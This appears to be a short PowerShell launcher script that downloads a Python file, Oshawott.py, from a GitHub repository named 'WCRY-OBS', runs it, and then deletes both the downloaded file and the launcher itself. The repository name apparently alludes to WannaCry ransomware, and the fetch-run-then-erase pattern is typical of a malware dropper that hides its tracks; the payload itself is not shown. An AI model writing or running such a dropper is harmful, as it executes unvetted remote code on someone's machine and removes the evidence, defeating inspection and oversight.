$url = 'https://raw.githubusercontent.com/bookbot2019/WCRY-OBS/main/Oshawott.py'
wget -Uri $url
python3 Oshawott.py
Remove-Item "Oshawott.py"
Remove-Item "LinuxFinalLauncher.ps1"